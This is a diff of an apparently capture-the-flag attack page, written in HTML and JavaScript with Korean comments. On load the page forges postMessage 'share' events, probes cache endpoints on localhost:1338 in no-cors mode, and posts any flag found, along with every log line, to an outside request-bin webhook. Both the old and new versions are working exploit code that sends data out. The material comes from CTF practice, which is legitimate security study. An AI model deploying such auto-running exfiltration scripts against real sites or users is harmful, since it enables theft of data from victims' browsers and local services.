@@ -1,76 +1,136 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Simple Flag Steal</title>
+    <title>Debug Attack</title>
 </head>
 <body>
-    <h1>🚩 Simple Flag Extraction</h1>
+    <h1>🔍 Debug Attack Page</h1>
+    <div id="status">Loading...</div>
     <div id="log"></div>
 
     <script>
         function log(msg) {
-            document.getElementById('log').innerHTML += '<div>' + msg + '</div>';
+            const div = document.createElement('div');
+            div.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            document.getElementById('log').appendChild(div);
             console.log(msg);
-        }
-
-        async function stealFlag() {
-            log("🎯 Starting simple flag steal...");
-
-            // 1. postMessage로 cached=true 파일 추가
-            const possibleFlags = [
-                "CTF{dummy_flag}",
-                "CTF{test_flag}",
-                "CTF{postviewer_v5_pwned}",
-                "flag{test}",
-                // 더 많은 가능한 플래그들...
-            ];
-
-            for (const flag of possibleFlags) {
-                const blob = new Blob([flag], { type: "text/plain" });
-                
-                window.postMessage({
-                    type: "share",
-                    files: [{
-                        blob: blob,
-                        cached: true,  // 🎯 이게 핵심!
-                        name: "flag.txt",
-                    }],
-                }, "*");
-                
-                log(`📤 Added cached file: ${flag}`);
-            }
-
-            // 2. 캐시된 파일들 읽어오기
-            log("🔍 Reading cached files...");
             
-            for (let i = 1; i <= 20; i++) {
-                try {
-                    const response = await fetch(`http://localhost:1338/?cache=${i}`);
-                    if (response.ok) {
-                        const content = await response.text();
-                        log(`✅ Cache ${i}: ${content}`);
+            // 웹훅으로도 로그 전송
+            try {
+                fetch('https://yhnbdot.request.dreamhack.games', {
+                    method: 'POST',
+                    body: `LOG: ${msg}`
+                }).catch(() => {});
+            } catch (e) {}
+        }
+
+        function updateStatus(msg) {
+            document.getElementById('status').innerHTML = msg;
+            log(msg);
+        }
+
+        async function simpleAttack() {
+            try {
+                updateStatus("🚀 Attack started");
+
+                // 1. 우선 간단한 postMessage만 시도
+                updateStatus("📤 Adding cached files...");
+                
+                const testFlags = ["CTF{dummy_flag}", "CTF{test}"];
+                
+                for (const flag of testFlags) {
+                    try {
+                        const blob = new Blob([flag], { type: "text/plain" });
                         
-                        // 플래그 패턴 체크
-                        if (content.includes('CTF{') || content.includes('flag{')) {
-                            log(`🚩 FLAG FOUND: ${content}`);
-                            
-                            // 웹훅으로 전송
-                            fetch('https://yhnbdot.request.dreamhack.games', {
-                                method: 'POST',
-                                body: `FLAG: ${content}`
-                            });
-                        }
+                        window.postMessage({
+                            type: "share",
+                            files: [{
+                                blob: blob,
+                                cached: true,
+                                name: "flag.txt",
+                            }],
+                        }, "*");
+                        
+                        log(`✅ Added: ${flag}`);
+                    } catch (e) {
+                        log(`❌ postMessage error: ${e.message}`);
                     }
-                } catch (error) {
-                    log(`❌ Cache ${i} failed: ${error.message}`);
                 }
+
+                updateStatus("⏳ Waiting 3 seconds...");
+                await new Promise(resolve => setTimeout(resolve, 3000));
+
+                // 2. 단순 fetch 시도 (한 번만)
+                updateStatus("🔍 Testing fetch...");
+                
+                try {
+                    log("Trying fetch to localhost:1338");
+                    const response = await fetch('http://localhost:1338/', {
+                        method: 'GET',
+                        mode: 'no-cors'  // CORS 우회 시도
+                    });
+                    log(`Fetch response status: ${response.status || 'unknown'}`);
+                } catch (e) {
+                    log(`Fetch error: ${e.message}`);
+                }
+
+                // 3. Cache 파일들 시도 (간단하게)
+                updateStatus("📁 Trying cache files...");
+                
+                for (let i = 1; i <= 5; i++) {
+                    try {
+                        log(`Trying cache=${i}`);
+                        
+                        const response = await fetch(`http://localhost:1338/?cache=${i}`, {
+                            mode: 'no-cors'
+                        });
+                        
+                        log(`Cache ${i}: response received`);
+                        
+                        if (response.type !== 'opaque') {
+                            const content = await response.text();
+                            log(`Cache ${i} content: ${content}`);
+                            
+                            if (content.includes('CTF{')) {
+                                log(`🚩 POTENTIAL FLAG: ${content}`);
+                                updateStatus(`🚩 FLAG FOUND: ${content}`);
+                                
+                                // 웹훅으로 전송
+                                await fetch('https://yhnbdot.request.dreamhack.games', {
+                                    method: 'POST',
+                                    body: `FLAG FOUND: ${content}`
+                                });
+                            }
+                        }
+                    } catch (e) {
+                        log(`Cache ${i} error: ${e.message}`);
+                    }
+                }
+
+                updateStatus("✅ Attack completed");
+
+            } catch (error) {
+                log(`💥 Main error: ${error.message}`);
+                updateStatus(`❌ Error: ${error.message}`);
             }
         }
 
-        // 페이지 로드 후 실행
+        // 즉시 시작 (타이머 없이)
         window.onload = function() {
-            setTimeout(stealFlag, 2000);
+            log("🎯 Page loaded - starting attack immediately");
+            simpleAttack();
         };
+
+        // 추가 디버깅: 모든 에러 캐치
+        window.onerror = function(msg, url, line, col, error) {
+            log(`💥 Global error: ${msg} at ${line}:${col}`);
+            return false;
+        };
+
+        // Promise rejection 캐치
+        window.addEventListener('unhandledrejection', function(event) {
+            log(`💥 Unhandled promise rejection: ${event.reason}`);
+        });
     </script>
 </body>
 </html>
